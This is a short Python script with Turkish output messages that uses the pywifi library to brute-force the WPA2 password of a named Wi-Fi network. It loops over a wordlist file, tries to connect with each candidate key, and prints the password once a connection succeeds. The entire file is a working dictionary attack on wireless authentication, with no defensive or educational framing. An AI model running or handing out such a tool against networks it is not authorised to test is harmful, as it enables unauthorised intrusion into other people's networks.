import time
from pywifi import Profile
from pywifi import PyWiFi
from pywifi import const
import comtypes

ssid='Tarik'
file_path="D:\Masaüstü\Python\WifiPassword\key.txt"

try:
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()
    result = iface.scan_result()

except:
    print('Hata')

def passaTry(ssid,file_path):
    count = 0
    with open( file_path , 'r' , encoding='utf8')as words:
        for word in words:
            count+=1
            word = word.split('\n')
            passa = word[0]
            main(ssid,passa,count)

def main(ssid,passa,count):
    profile = Profile()
    profile.ssid=ssid
    profile.auth=const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher=const.CIPHER_TYPE_CCMP

    profile.key=passa

    iface.remove_all_network_profiles()
    connect=iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(connect)
    time.sleep(0.5)

    if iface.status() ==const.IFACE_CONNECTED:
        time.sleep(1)
        print('ŞİFRE  :'+passa)
        exit()
    else:
        print(f'[{count}] şifre denendi ama bulunamadı {passa}')

passaTry(ssid,file_path)